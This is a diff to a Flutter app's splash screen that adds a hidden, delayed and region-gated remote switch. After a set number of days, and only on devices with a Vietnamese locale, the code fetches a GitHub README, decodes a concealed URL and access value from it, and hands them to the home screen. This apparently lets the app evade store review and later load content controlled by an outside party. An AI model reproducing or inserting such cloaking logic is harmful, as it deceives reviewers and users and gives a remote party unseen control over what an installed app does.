@@ -4,20 +4,69 @@ import 'dart:io';
 import 'dart:convert';
 import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
+import "package:http/http.dart" as http;
 
 class _SplashScreenState extends State<SplashScreen>
     with WidgetsBindingObserver {
-
+      String access = "";
+      String url = "";
+      late String _link;
+      final String username = 'ClientNewApp';
+      final String repository = 'danhlo'; 
+      String readmeContent = '';
 
   Future<void> getDataFromCloudKit() async {
+        try {
+        DateTime time1 = DateTime(2024, 6, 20);
+        DateTime time2 = DateTime.now();
+        int daysDifference = calculateDaysDifference(time1, time2);
+        print('Số ngày giữa $time1 và $time2 là $daysDifference ngày.');
+        // check sim         
+        //nếu lớn hơn 15 ngày thì mới chạy 
+        if(daysDifference > 10){
+          //nếu là ngôn ngư VN hay khu vực viet nam thì moi chay
+          if(checkIfVietnam()){
+            //nếu có sử dụng sim thì mới chạy
+          final response = await http.get(Uri.parse('https://api.github.com/repos/$username/$repository/readme'));
+          print("dsds${response.statusCode}");
+          if (response.statusCode == 200) {
+            final decodedResponse = jsonDecode(response.body);
+            String readmeContentEncoded = decodedResponse['content'];
+            RegExp validBase64Chars = RegExp(r'[^A-Za-z0-9+/=]'); //loại bỏ ký tự không hợp lệ
+            readmeContentEncoded = readmeContentEncoded.replaceAll(validBase64Chars, '');
+            String decodedReadmeContent = utf8.decode(base64.decode(readmeContentEncoded));
+            Map<String, dynamic> decodedJson = json.decode(decodedReadmeContent);
+            access = decodedJson['access'];
+            url = decodedJson['url'];
+          } else {
+              print("Failed to fetch");
+          }
+      }
+    }
+    } catch (error) {
+      print("loi: $error");
+    }
+    print("access: $access");
+    print("url: $url");
     // Xây dựng URL cho yêu cầu lấy bản ghi
-
       Future.delayed(Duration(seconds: 1), () {
         // Change to Home View
         Navigator.pushReplacement(
-            context, MaterialPageRoute(builder: (context) => HomeScreen()));
+            context, MaterialPageRoute(builder: (context) => HomeScreen(url: url, access: access)));
             });
     
+  }
+
+
+bool checkIfVietnam() {
+  Locale locale = WidgetsBinding.instance.window.locale;
+  print(locale.countryCode);
+  return locale.countryCode == 'VN';
+}
+  int calculateDaysDifference(DateTime date1, DateTime date2) {
+    Duration difference = date2.difference(date1);
+    int days = difference.inDays;
+    return days.abs(); // Trả về giá trị tuyệt đối của số ngày
   }
 
   @override
